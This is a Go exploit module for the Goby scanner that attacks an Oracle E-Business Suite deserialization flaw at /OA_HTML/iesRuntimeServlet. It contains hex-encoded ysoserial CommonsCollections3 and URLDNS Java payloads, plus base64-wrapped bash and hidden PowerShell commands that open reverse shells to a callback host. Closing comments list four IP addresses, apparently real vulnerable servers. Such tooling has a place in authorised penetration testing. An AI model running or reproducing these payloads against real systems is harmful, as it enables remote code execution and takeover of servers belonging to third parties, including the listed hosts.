package exploits

import (
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Oracle E-Business Suite iesRuntimeServlet Deserialization Vulnerability",
    "Description": "<p>Oracle E-Business Suite (Electronic Business Suite) is a set of fully integrated global business management software from Oracle Corporation of the United States. The software provides customer relationship management, service management, financial management and other functions.</p><p>Oracle E-Business Suite could allow a remote attacker to execute arbitrary code on the system, caused by a deserialization flaw in the iesRuntimeServlet endpoint. By using specially crafted serialized data, an attacker could exploit this vulnerability to execute arbitrary code on the system.</p>",
    "Product": "Oracle-EBusiness",
    "Homepage": "https://www.oracle.com/",
    "DisclosureDate": "2018-04-03",
    "Author": "sharecast.net@gmail.com",
    "FofaQuery": "title=\"E-Business Suite Home Page\" || body=\"/OA_HTML/AppsLogin\" || (body=\"Template <AD_TOP>/admin/template/index.html\" && body=\"/OA_HTML/\") ||  body=\"/OA_HTML/AppsLocalLogin.jsp\" || header=\"/OA_HTML/AppsLogin\"  || banner=\"/OA_HTML/AppsLogin\"",
    "GobyQuery": "title=\"E-Business Suite Home Page\" || body=\"/OA_HTML/AppsLogin\" || (body=\"Template <AD_TOP>/admin/template/index.html\" && body=\"/OA_HTML/\") ||  body=\"/OA_HTML/AppsLocalLogin.jsp\" || header=\"/OA_HTML/AppsLogin\"  || banner=\"/OA_HTML/AppsLogin\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:</p><p><a href=\"https://www.oracle.com/applications/ebusiness/\">https://www.oracle.com/applications/ebusiness/</a></p>",
    "References": [
        "https://erpscan.io/press-center/blog/oracle-ebs-penetration-testing-tool/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "goby_shell_linux,goby_shell_win",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Oracle E-Business Suite iesRuntimeServlet 反序列化漏洞",
            "Product": "Oracle-EBusiness",
            "Description": "<p>Oracle E-Business Suite（电子商务套件）是美国甲骨文（Oracle）公司的一套全面集成式的全球业务管理软件。该软件提供了客户关系管理、服务管理、财务管理等功能。</p><p>Oracle E-Business Suite 可能允许远程攻击者在系统上执行任意代码，这是由 iesRuntimeServlet 端点中的反序列化缺陷引起的。通过使用特制的序列化数据，攻击者可以利用此漏洞在系统上执行任意代码。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：</p><p><a href=\"https://www.oracle.com/applications/ebusiness/\" target=\"_blank\">https://www.oracle.com/applications/ebusiness/</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Oracle E-Business Suite iesRuntimeServlet Deserialization Vulnerability",
            "Product": "Oracle-EBusiness",
            "Description": "<p>Oracle E-Business Suite (Electronic Business Suite) is a set of fully integrated global business management software from Oracle Corporation of the United States. The software provides customer relationship management, service management, financial management and other functions.</p><p>Oracle E-Business Suite could allow a remote attacker to execute arbitrary code on the system, caused by a deserialization flaw in the iesRuntimeServlet endpoint. By using specially crafted serialized data, an attacker could exploit this vulnerability to execute arbitrary code on the system.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in&nbsp;<span style=\"color: var(--primaryFont-color);\">time:</span></p><p><a href=\"https://www.oracle.com/applications/ebusiness/\" target=\"_blank\">https://www.oracle.com/applications/ebusiness/</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10666"
}`



	genCommonsCollections3 := func(cmd string) string {
		payloadPart1 := "aced00057372003273756e2e7265666c6563742e616e6e6f746174696f6e2e416e6e6f746174696f6e496e766f636174696f6e48616e646c657255caf50f15cb7ea50200024c000c6d656d62657256616c75657374000f4c6a6176612f7574696c2f4d61703b4c0004747970657400114c6a6176612f6c616e672f436c6173733b7870737d00000001000d6a6176612e7574696c2e4d6170787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707371007e00007372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000027372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b787076720037636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e5472415846696c746572000000000000000000000078707372003e6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e7374616e74696174655472616e73666f726d6572348bf47fa486d03b0200025b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c0200007870000000017372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c61737371007e00184c00055f6e616d657400124c6a6176612f6c616e672f537472696e673b4c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000002757200025b42acf317f8060854e002000078700000"
		payloadLen := fmt.Sprintf("%04x",1686+len(cmd))
		payloadPart2 := "cafebabe0000003200390a0003002207003707002507002601001073657269616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c756505ad2093f391ddef3e0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c6501000474686973010013537475625472616e736c65745061796c6f616401000c496e6e6572436c61737365730100354c79736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324537475625472616e736c65745061796c6f61643b0100097472616e73666f726d010072284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b2956010008646f63756d656e7401002d4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b01000868616e646c6572730100425b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b01000a457863657074696f6e730700270100a6284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b29560100086974657261746f720100354c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b01000768616e646c65720100414c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b01000a536f7572636546696c6501000c476164676574732e6a6176610c000a000b07002801003379736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324537475625472616e736c65745061796c6f6164010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740100146a6176612f696f2f53657269616c697a61626c65010039636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f5472616e736c6574457863657074696f6e01001f79736f73657269616c2f7061796c6f6164732f7574696c2f476164676574730100083c636c696e69743e0100116a6176612f6c616e672f52756e74696d6507002a01000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b0c002c002d0a002b002e01"
		cmdLen := fmt.Sprintf("%04x",len(cmd))
		payloadPart3 := "08003001000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0c003200330a002b003401000d537461636b4d61705461626c6501001e79736f73657269616c2f50776e65723139313235373634313438383530390100204c79736f73657269616c2f50776e65723139313235373634313438383530393b002100020003000100040001001a000500060001000700000002000800040001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010000002f000e0000000c000100000005000f003800000001001300140002000c0000003f0000000300000001b100000002000d00000006000100000033000e00000020000300000001000f0038000000000001001500160001000000010017001800020019000000040001001a00010013001b0002000c000000490000000400000001b100000002000d00000006000100000036000e0000002a000400000001000f003800000000000100150016000100000001001c001d000200000001001e001f00030019000000040001001a00080029000b0001000c00000024000300020000000fa70003014cb8002f1231b6003557b1000000010036000000030001030002002000000002002100110000000a000100020023001000097571007e0023000001d4cafebabe00000032001b0a0003001507001707001807001901001073657269616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c75650571e669ee3c6d47180100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c6501000474686973010003466f6f01000c496e6e6572436c61737365730100254c79736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324466f6f3b01000a536f7572636546696c6501000c476164676574732e6a6176610c000a000b07001a01002379736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324466f6f0100106a6176612f6c616e672f4f626a6563740100146a6176612f696f2f53657269616c697a61626c6501001f79736f73657269616c2f7061796c6f6164732f7574696c2f47616467657473002100020003000100040001001a000500060001000700000002000800010001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010000003a000e0000000c000100000005000f001200000002001300000002001400110000000a000100020016001000097074000450776e727077010078757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000017672001d6a617661782e786d6c2e7472616e73666f726d2e54656d706c6174657300000000000000000000007870737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000000770800000010000000007878767200126a6176612e6c616e672e4f766572726964650000000000000000000000787071007e002e"
		payload := strings.Join([]string{payloadPart1, payloadLen, payloadPart2, cmdLen,hex.EncodeToString([]byte(cmd)), payloadPart3}, "")
		payloadHex, _ := hex.DecodeString(payload)
		alldata := bytes.NewBuffer(payloadHex).String()
		return alldata
	}

	genURLDNS := func(host string) string {
		payloadStart := "aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00034c0004686f737471007e00034c000870726f746f636f6c71007e00034c000372656671007e00037870ffffffffffffffff74"
		payloadHostLen := fmt.Sprintf("%04x",len(host))
		payloadHost := hex.EncodeToString([]byte(host))
		payload2 := "74000071007e000574000468747470707874000331313178"
		payload := strings.Join([]string{payloadStart, payloadHostLen, payloadHost,payload2}, "")
		payloadStr, _ := hex.DecodeString(payload)
		byteStr := bytes.NewBuffer(payloadStr).String()
		return byteStr
	}


	ofbBashBase64CMD := func(cmd string) string{
		cmdBase64 := base64.StdEncoding.EncodeToString([]byte(cmd))
		cmdstr := fmt.Sprintf(`bash -c {echo,%s}|{base64,-d}|{bash,-i}`,cmdBase64)
		return cmdstr
	}

	ofbPowerShellBase64CMD := func(cmd string) string{
		cmdBase64 := base64.StdEncoding.EncodeToString([]byte(cmd))
		cmdstr := fmt.Sprintf(`powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc %s`,cmdBase64)
		return cmdstr
	}


	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/OA_HTML/iesRuntimeServlet"
			checkStr := goutils.RandomHexString(6)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			payload := genURLDNS(checkUrl)

			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Data = payload
			if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return godclient.PullExists(checkStr, time.Second*5)
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/OA_HTML/iesRuntimeServlet"
			if ss.Params["AttackType"].(string) == "goby_shell_linux" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					cmd := godclient.ReverseTCPByBash(rp)
					payload := genCommonsCollections3(fmt.Sprintf("%s",ofbBashBase64CMD(cmd)))
					cfg := httpclient.NewPostRequestConfig(uri)
					cfg.VerifyTls = false
					cfg.Data = payload
					go httpclient.DoHttpRequest(expResult.HostInfo, cfg)

					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 15):
					}
				}
			}
			if ss.Params["AttackType"].(string) == "goby_shell_win" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					cmd := godclient.ReverseTCPByPowershell(rp)
					payload := genCommonsCollections3(ofbPowerShellBase64CMD(cmd))
					cfg := httpclient.NewPostRequestConfig(uri)
					cfg.VerifyTls = false
					cfg.Data = payload
					go httpclient.DoHttpRequest(expResult.HostInfo, cfg)

					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 15):
					}
				}
			}
			return expResult
		},
	))

}

//http://202.122.146.105:8000
//http://182.72.135.238:8010
//http://163.171.200.149:8000
//http://103.1.138.50:8000